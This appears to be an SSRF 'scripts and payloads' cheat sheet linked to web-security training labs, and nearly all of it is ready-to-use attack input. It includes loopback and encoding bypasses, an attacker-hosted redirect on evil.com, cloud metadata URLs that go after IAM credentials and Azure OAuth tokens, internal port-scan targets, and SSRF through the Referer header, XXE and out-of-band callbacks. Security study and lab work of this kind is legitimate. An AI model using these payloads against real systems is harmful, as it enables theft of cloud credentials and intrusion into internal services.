# SSRF — Scripts & Payloads

## Blacklist Bypass Payloads

### Alternative IP Representations for 127.0.0.1
```
http://127.0.0.1/
http://127.1/
http://2130706433/
http://017700000001/
http://0x7f000001/
```

### Bypassing Blocked `/admin` Path (Double URL Encoding)
```
# Single encode
http://127.1/%61dmin

# Double encode (bypasses filters that decode once)
http://127.1/%2561dmin

# Full double encode
http://127.1/%2F%2561%2564%256D%2569%256E
```

### Case Variation
```
http://lOcAlHoSt/admin
http://LOCALHOST/ADMIN
http://LocalHost/Admin
```

### Domain That Resolves to 127.0.0.1
```
# Use spoofed.burpcollaborator.net
http://spoofed.burpcollaborator.net/admin

# Or register your own domain pointing to 127.0.0.1
http://yourdomain.com/admin
```

### Redirect Trick
```
# Host this on your server (evil.com/redirect):
<?php header("Location: http://127.0.0.1/admin"); ?>

# Then send:
stockApi=http://evil.com/redirect

# Protocol switch during redirect (bypass some filters):
http://evil.com/redirect  →  redirects to  →  https://127.0.0.1/admin
```

---

## Whitelist Bypass Payloads

### @ Credential Embedding
```
# Basic
http://localhost@stock.weliketoshop.net/

# With path
http://localhost@stock.weliketoshop.net/admin

# With port
http://localhost:80@stock.weliketoshop.net/admin
```

### # Fragment Trick
```
http://evil.com#stock.weliketoshop.net
http://evil.com#@stock.weliketoshop.net
```

### Subdomain Abuse
```
# You own evil.com, create subdomain:
http://stock.weliketoshop.net.evil.com
```

### Combined (@ + Double Encoded #)
```
# This is the lab solution pattern:
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

# Breakdown:
# %2523 = double encoded # (becomes # after server decodes)
# localhost:80 = real destination
# @stock.weliketoshop.net = satisfies whitelist
```

---

## Cloud Metadata Payloads

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/
```

### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
```

---

## Internal Port Scanning via SSRF

```
# SSH
http://127.0.0.1:22/

# MySQL
http://127.0.0.1:3306/

# Redis
http://127.0.0.1:6379/

# Jenkins / Admin panels
http://127.0.0.1:8080/
http://127.0.0.1:8443/
http://127.0.0.1:9090/

# MongoDB
http://127.0.0.1:27017/

# Elasticsearch
http://127.0.0.1:9200/
http://127.0.0.1:9200/_cat/indices

# Memcached
http://127.0.0.1:11211/

# PostgreSQL
http://127.0.0.1:5432/

# SMTP
http://127.0.0.1:25/
```

---

## SSRF via Referer Header

```http
GET /product?id=1 HTTP/1.1
Host: vulnerable-site.com
Referer: http://127.0.0.1/admin

GET /product?id=1 HTTP/1.1
Host: vulnerable-site.com
Referer: http://169.254.169.254/latest/meta-data/

GET /product?id=1 HTTP/1.1
Host: vulnerable-site.com
Referer: http://internal-service.local/secret
```

---

## SSRF via XXE (XML)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://127.0.0.1/admin">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

```xml
<!-- Fetch cloud metadata via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

---

## Blind SSRF — Out-of-Band Detection

```http
# Via URL parameter
stockApi=http://YOUR.INTERACTSH.URL/

# Via Referer header
Referer: http://YOUR.INTERACTSH.URL/

# interactsh setup (free Collaborator alternative)
# 1. Download: https://github.com/projectdiscovery/interactsh
# 2. Run: interactsh-client
# 3. Get your URL: abc123.oast.fun
# 4. Use that URL as your callback
```

---

## URL Encoding Reference

```
# → %23
%23 → %2523  (double encoded)

/ → %2F
%2F → %252F  (double encoded)

@ → %40
. → %2E
: → %3A

a → %61
d → %64
m → %6D
i → %69
n → %6E
```

### Quick Double Encode Any String
```python
import urllib.parse

string = "/admin"
single = urllib.parse.quote(string)
double = urllib.parse.quote(single)
print(f"Single: {single}")
print(f"Double: {double}")
```
